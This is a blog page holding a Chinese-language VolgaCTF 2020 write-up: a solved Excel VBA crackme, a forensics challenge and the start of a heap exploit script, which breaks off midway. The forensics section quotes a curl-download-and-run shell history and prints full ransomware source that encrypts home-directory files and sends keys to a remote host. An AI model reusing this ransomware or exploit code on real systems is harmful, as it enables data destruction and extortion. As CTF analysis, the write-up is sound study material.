<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>VolgaCTF 2020 | xrivendell7</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content=".goydnfxbtlgu{zoom:80%;}  excellent-crackme-rev尼玛，用LibreOffice Calc打开exevl，vbs的密码自动解除…. 以后不用找工具了提取出vbscript，关键代码实际就在sub VolgaCTF中，手动解混淆后如下: 123456789101112131415161718192021Private Sub VolgaCTF()    D">
<meta property="og:type" content="article">
<meta property="og:title" content="VolgaCTF 2020">
<meta property="og:url" content="http://example.com/2020/03/30/2020volgactf/index.html">
<meta property="og:site_name" content="xrivendell7">
<meta property="og:description" content=".goydnfxbtlgu{zoom:80%;}  excellent-crackme-rev尼玛，用LibreOffice Calc打开exevl，vbs的密码自动解除…. 以后不用找工具了提取出vbscript，关键代码实际就在sub VolgaCTF中，手动解混淆后如下: 123456789101112131415161718192021Private Sub VolgaCTF()    D">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2020/03/30/2020volgactf/image-20251122130258123.png">
<meta property="og:image" content="http://tacqiniu.jagger2zr.com/20200331005140.png">
<meta property="article:published_time" content="2020-03-30T03:07:10.000Z">
<meta property="article:modified_time" content="2025-11-22T05:03:01.081Z">
<meta property="article:author" content="xrivendell7">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2020/03/30/2020volgactf/image-20251122130258123.png">
  
    <link rel="alternate" href="/atom.xml" title="xrivendell7" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">xrivendell7</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-2020volgactf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/03/30/2020volgactf/" class="article-date">
  <time class="dt-published" datetime="2020-03-30T03:07:10.000Z" itemprop="datePublished">2020-03-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      VolgaCTF 2020
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <style>.goydnfxbtlgu{zoom:80%;}</style><img src="/2020/03/30/2020volgactf/image-20251122130258123.png" class="goydnfxbtlgu" alt="image-20251122130258123">

<h2 id="excellent-crackme-rev"><a href="#excellent-crackme-rev" class="headerlink" title="excellent-crackme-rev"></a>excellent-crackme-rev</h2><p>尼玛，用LibreOffice Calc打开exevl，vbs的密码自动解除…. 以后不用找工具了<br>提取出vbscript，关键代码实际就在<code>sub VolgaCTF</code>中，手动解混淆后如下:</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Private Sub <span class="title">VolgaCTF</span>()</span></span><br><span class="line"><span class="function">    Dim flag As String</span></span><br><span class="line"><span class="function">    Dim num As Long</span></span><br><span class="line"><span class="function">    Dim tmp As Long</span></span><br><span class="line"><span class="function">    Dim <span class="keyword">value</span> As Long</span></span><br><span class="line"><span class="function">    flag</span> = Range(<span class="string">&quot;L15&quot;</span>)</span><br><span class="line">    For i = <span class="number">1</span> <span class="function">To <span class="title">Len</span>(<span class="params">flag</span>)</span></span><br><span class="line"><span class="function">        num</span> = <span class="number">0</span></span><br><span class="line">        For j = <span class="number">1</span> <span class="function">To <span class="title">Len</span>(<span class="params">flag</span>)</span></span><br><span class="line"><span class="function">            tmp</span> = CInt(Cells(<span class="number">99</span> + i, <span class="number">99</span> + j).Value)</span><br><span class="line">            ch = Mid(flag, j, <span class="number">1</span>)</span><br><span class="line">            num = num + tmp * Asc(ch)</span><br><span class="line">            Next j</span><br><span class="line">            <span class="keyword">value</span> = CLng(Cells(<span class="number">99</span> + i, <span class="number">99</span> + Len(flag) + <span class="number">1</span>).Value)</span><br><span class="line">            If (<span class="keyword">value</span> &lt;&gt; num) <span class="function">Then</span></span><br><span class="line"><span class="function">                MsgBox <span class="title">mWfDCE1CY0a</span>(<span class="params"><span class="string">&quot;yrr9VuqqcETgYfVV&quot;</span></span>) &#x27;failed&#x27;</span></span><br><span class="line"><span class="function">                Exit Sub</span></span><br><span class="line"><span class="function">            End If</span></span><br><span class="line"><span class="function">            Next i</span></span><br><span class="line"><span class="function">    MsgBox <span class="title">mWfDCE1CY0a</span>(<span class="params"><span class="string">&quot;mq19VeLpVFr42H1d&quot;</span></span>)   &#x27;success&#x27;</span></span><br><span class="line"><span class="function">End Sub</span></span><br></pre></td></tr></table></figure>

<p>可见,flag是在execl中的数据计算产生的，数据在(100,100) cell后，如下图:<br><img src="http://tacqiniu.jagger2zr.com/20200331005140.png"></p>
<p>是一个多元一次线性方程组，用numpy求解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># VolgaCTF&#123;7h3_M057_M47h_cr4ckM3_y0u_3V3R_533N&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_excel</span>(<span class="params">f</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = xlrd.open_workbook(f)</span><br><span class="line">        table = data.sheets()[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;open excel error&#x27;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    a = []</span><br><span class="line">    b = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>,<span class="number">144</span>):</span><br><span class="line">        a.append(table.row_values(row)[<span class="number">99</span>:<span class="number">144</span>])</span><br><span class="line">        b.append(table.row_values(row)[<span class="number">144</span>])</span><br><span class="line">    <span class="keyword">return</span> (a,b)</span><br><span class="line"></span><br><span class="line">(x,y) = read_excel(<span class="string">&#x27;./VolgaCTF_excel_crackme.xlsm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">x = np.array(x)</span><br><span class="line">y = np.array(y)</span><br><span class="line"></span><br><span class="line">r = np.linalg.solve(x,y)</span><br><span class="line">r = <span class="built_in">list</span>(r)</span><br><span class="line">r = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">map</span>(<span class="built_in">round</span>,r)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytearray</span>(r))</span><br></pre></td></tr></table></figure>

<h2 id="ScriptKiddie-forensics"><a href="#ScriptKiddie-forensics" class="headerlink" title="ScriptKiddie-forensics"></a>ScriptKiddie-forensics</h2><p>下载Ubuntu.ova后, 通过Recovery mode登录修改Root密码后登录系统.<br>Then we extracted the relevant files from <code>/home</code> which had two users prod and test:<br>在test下查看.bash_history:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.1.38/clev.py &gt; .s.py</span><br><span class="line">curl http://192.168.1.38:8080/clev.py &gt; .s.py</span><br><span class="line">curl http://192.168.1.38:8888/clev.py &gt; .s.py</span><br><span class="line">curl http://192.168.1.38:1111/clev.py &gt; .s.py</span><br><span class="line">file .s.py</span><br><span class="line">python3.7 .s.py</span><br><span class="line"><span class="built_in">rm</span> .s.py</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>发现作者下载了clev.py用来加密文件,<code>secrets.txt.enc</code>中很可能是加密后的flag </br><br>在prod用户下恰好记录了流量<code>EvaDump.pcap</code>(根据题目提示也可以得到该信息) </br><br>在Wireshark中设置Filter <code>http and ip.dst==192.168.1.38</code>找到curl流量中的clev.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">F = <span class="built_in">len</span></span><br><span class="line">W = <span class="built_in">bytes</span></span><br><span class="line">L = <span class="built_in">open</span></span><br><span class="line">B = <span class="literal">True</span></span><br><span class="line">R = <span class="literal">False</span></span><br><span class="line">o = <span class="built_in">range</span></span><br><span class="line">l = exit</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">z = sys.platform</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">J = os.walk</span><br><span class="line">T = os.remove</span><br><span class="line">S = os.environ</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">h = platform.system</span><br><span class="line">E = platform.machine</span><br><span class="line">e = platform.platform</span><br><span class="line">X = platform.node</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">a = hashlib.sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">C = string.ascii_letters</span><br><span class="line">O = <span class="number">0</span></span><br><span class="line">N = <span class="number">1</span></span><br><span class="line">G = <span class="number">2</span></span><br><span class="line">g = (<span class="string">&#x27;192.168.1.38&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">x</span>(<span class="params">u</span>):</span><br><span class="line">    y = <span class="number">16</span> - (F(u) % <span class="number">16</span>)</span><br><span class="line">    u += W([y]) * y</span><br><span class="line">    <span class="keyword">return</span> u</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">w</span>(<span class="params">u</span>):</span><br><span class="line">    u = u[:-u[-<span class="number">1</span>]]</span><br><span class="line">    <span class="keyword">return</span> u</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">U = [<span class="string">&#x27;.doc&#x27;</span>, <span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;.rc&#x27;</span>, <span class="string">&#x27;.ini&#x27;</span>, <span class="string">&#x27;.dat&#x27;</span>, <span class="string">&#x27;.conf&#x27;</span>, <span class="string">&#x27;_history&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">V</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">Q</span>):</span><br><span class="line">        f = X() + <span class="string">&#x27;//&#x27;</span> + e()</span><br><span class="line">        d = S[<span class="string">&#x27;HOME&#x27;</span>]</span><br><span class="line">        P = d.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        v = E()</span><br><span class="line">        D = h()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">            <span class="keyword">import</span> getpass</span><br><span class="line">            P = getpass.getuser()</span><br><span class="line">            d = <span class="string">&#x27;/home/&#x27;</span> + P</span><br><span class="line">        b = <span class="string">&#x27;:&#x27;</span>.join(x <span class="keyword">for</span> x <span class="keyword">in</span>[f, v, D, P, d])</span><br><span class="line">        Q.<span class="built_in">id</span> = a(b.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">        Q.system = D</span><br><span class="line">        Q.machine = v</span><br><span class="line">        Q.user = P</span><br><span class="line">        Q.home = d</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;linux&quot;</span> <span class="keyword">in</span> z:</span><br><span class="line">            Q.platform = O</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;darwin&quot;</span> <span class="keyword">in</span> z:</span><br><span class="line">            Q.platform = N</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;win32&quot;</span> <span class="keyword">in</span> z:</span><br><span class="line">            Q.platform = G</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = L(<span class="string">&#x27;/tmp/.X11.&#x27;</span> + Q.<span class="built_in">id</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            Q.inf = B</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            f = L(<span class="string">&#x27;/tmp/.X11.&#x27;</span> + Q.<span class="built_in">id</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            Q.inf = R</span><br><span class="line">            f.write(Q.<span class="built_in">id</span>)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">Q, c, fl</span>):</span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        J = os.walk</span><br><span class="line">        T = os.remove</span><br><span class="line">        S = os.environ</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = L(fl, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">            d = f.read()</span><br><span class="line">            f.close()</span><br><span class="line">            d = x(d)</span><br><span class="line">            q = c.encrypt(d)</span><br><span class="line">            f = L(fl + <span class="string">&#x27;.enc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            f.write(q)</span><br><span class="line">            f.close()</span><br><span class="line">            T(fl)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">Q</span>):</span><br><span class="line">        <span class="keyword">import</span> socket</span><br><span class="line">        <span class="keyword">import</span> random</span><br><span class="line">        <span class="keyword">import</span> base64</span><br><span class="line">        M = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> o(<span class="number">16</span>):</span><br><span class="line">            p = <span class="string">&#x27;&#x27;</span>.join(random.choices(C, k=<span class="number">16</span>))</span><br><span class="line">            M.append(p)</span><br><span class="line">        u = <span class="string">&#x27;,&#x27;</span>.join(k <span class="keyword">for</span> k <span class="keyword">in</span> M)</span><br><span class="line">        u = W(u, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        u = base64.b64encode(u)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect(g)</span><br><span class="line">        s.sendall(W(Q.<span class="built_in">id</span>, <span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        s.recv(<span class="number">1</span>)</span><br><span class="line">        s.sendall(u)</span><br><span class="line">        <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">        c = AES.new(p, AES.MODE_ECB)</span><br><span class="line">        <span class="keyword">for</span>(dirpath, dirnames, filenames)<span class="keyword">in</span> J(Q.home):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;.ssh&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> dirnames:</span><br><span class="line">                <span class="keyword">for</span> fn <span class="keyword">in</span> filenames:</span><br><span class="line">                    <span class="keyword">for</span> e <span class="keyword">in</span> U:</span><br><span class="line">                        <span class="keyword">if</span> fn.endswith(e):</span><br><span class="line">                            Q.r(c, dirpath + <span class="string">&#x27;/&#x27;</span> + fn)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">        f = L(Q.home + <span class="string">&#x27;/message&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        f.write(W(<span class="string">&#x27;All your files was encrypted\n. Contact Ywe23z3565yrgbv@protonmail.com for information(mention IP address on theme)\n&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">k = V()</span><br><span class="line"><span class="keyword">if</span> k.platform != O:</span><br><span class="line">    l(-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> k.inf:</span><br><span class="line">    l(<span class="number">0</span>)</span><br><span class="line">k.t()</span><br></pre></td></tr></table></figure>
<p>使用AES 256bit的CBC_MODE加密,密钥组Base64发送给了<code>192.168.1.38, 9999</code><br>再次在Wireshark中添加Filter: <code>tcp.port ==9999 and tcp and ip.dst == 192.168.1.38</code><br>找到密钥组Base64:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bVRHZWxqaERSS0FTS0toUSxGTHJzU0V2ZVFRaWxvUFJuLFhlZFhIWUJVSHBJWERCSlAsSU9HUEVyam9zeE5pUXJOTSxSenZwYkVVUkxkRmZhR0ZNLHZkQlZEQ3ZpeGpTaENRdnksRVFsY3NuVXR6Q0h5RlBITSxKa0RpamdBRmlWQldKYUx6LGdoY1BJT1NxQ2RDVHFPcEQsRG5lQ3dia0RIa29qcHBIbSxsVlJaUmVBbGFJekhnaXNjLE5kamNnVlZqaWlueGZ0Q0MsUmtnTHBSQ3FybmlicnFzTixremV3dGVBZ1BFWmRrelFKLEhucEdvVWVxY2tFcXhwUW0sTFNOV1JhclRoUmRpUExwTQ==</span><br></pre></td></tr></table></figure>

<p>AES解密脚本得到flag,注意Python3的bytes和string有大坑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex,a2b_hex</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="comment"># flag&#123;26c08ad080830d6dcd76c15009ab6b03&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt_ecb</span>(<span class="params">m,key</span>):</span><br><span class="line">    cipher = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    c = cipher.decrypt(m)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">k = <span class="string">&quot;bVRHZWxqaERSS0FTS0toUSxGTHJzU0V2ZVFRaWxvUFJuLFhlZFhIWUJVSHBJWERCSlAsSU9HUEVyam9zeE5pUXJOTSxSenZwYkVVUkxkRmZhR0ZNLHZkQlZEQ3ZpeGpTaENRdnksRVFsY3NuVXR6Q0h5RlBITSxKa0RpamdBRmlWQldKYUx6LGdoY1BJT1NxQ2RDVHFPcEQsRG5lQ3dia0RIa29qcHBIbSxsVlJaUmVBbGFJekhnaXNjLE5kamNnVlZqaWlueGZ0Q0MsUmtnTHBSQ3FybmlicnFzTixremV3dGVBZ1BFWmRrelFKLEhucEdvVWVxY2tFcXhwUW0sTFNOV1JhclRoUmRpUExwTQ==&quot;</span></span><br><span class="line">k = base64.b64decode(k).decode()</span><br><span class="line">k = k.replace(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">key = k[-<span class="number">16</span>:].encode()</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">open</span>(<span class="string">&#x27;./secrets.txt.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">res = aes_encrypt_ecb(d,key)</span><br><span class="line"><span class="built_in">print</span>(res.decode())</span><br></pre></td></tr></table></figure>

<h2 id="notepad-pwn"><a href="#notepad-pwn" class="headerlink" title="notepad-pwn"></a>notepad-pwn</h2><p>简单的Tcache,题目中有太多overflow的地方…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># VolgaCTF&#123;i5_g1ibc_mall0c_irr3p@rable?&#125;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">HOST,PORT = <span class="string">&#x27;notepad.q.2020.volgactf.ru&#x27;</span>, <span class="number">45678</span></span><br><span class="line">p = remote(HOST,PORT)</span><br><span class="line"><span class="comment"># p = process(&#x27;./notepad&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./notepad&#x27;</span>)</span><br><span class="line">l = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">name</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pick_note</span>(<span class="params">idx</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele_note</span>(<span class="params">idx</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_note</span>():</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span 